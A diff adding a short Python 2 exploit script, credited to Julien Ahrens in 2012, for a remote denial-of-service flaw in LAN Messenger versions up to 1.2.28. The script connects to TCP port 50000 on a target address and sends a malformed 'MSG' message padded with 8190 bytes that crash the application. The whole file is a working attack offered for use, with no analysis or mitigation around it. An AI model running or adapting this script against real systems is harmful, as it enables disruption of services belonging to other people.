@@ -1,0 +1,36 @@
+#!/usr/bin/python
+ 
+# Exploit Title: LAN Messenger <= v1.2.28 Remote Denial of Service Vulnerability
+# Version:       <= v1.2.28
+# Date:          2012-04-28
+# Author:        Julien Ahrens
+# Homepage:      www.inshell.net
+# Software Link: http://lanmsngr.sourceforge.net/
+# Tested on:     Windows XP SP3 Professional German, Windows 2008R2 SP1 German
+# Notes:         Under WinXP the app needs 8190 Bytes to crash
+# Howto:         -
+
+from struct import pack
+import socket,sys
+import os
+
+target="192.168.0.1"
+port=50000
+
+junk = "\x41" * 8190 
+
+print "[*] Connecting to Target " + target + "..."
+
+s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+try:
+    connect=s.connect((target, port))
+    print "[*] Connected to " + target + "!"
+except:
+    print "[!] " + target + " didn't respond\n"
+    sys.exit(0)
+
+print "[*] Sending malformed request..."
+s.send("\x4d\x53\x47" + junk)
+
+print "[!] Exploit has been sent!\n"
+s.close()
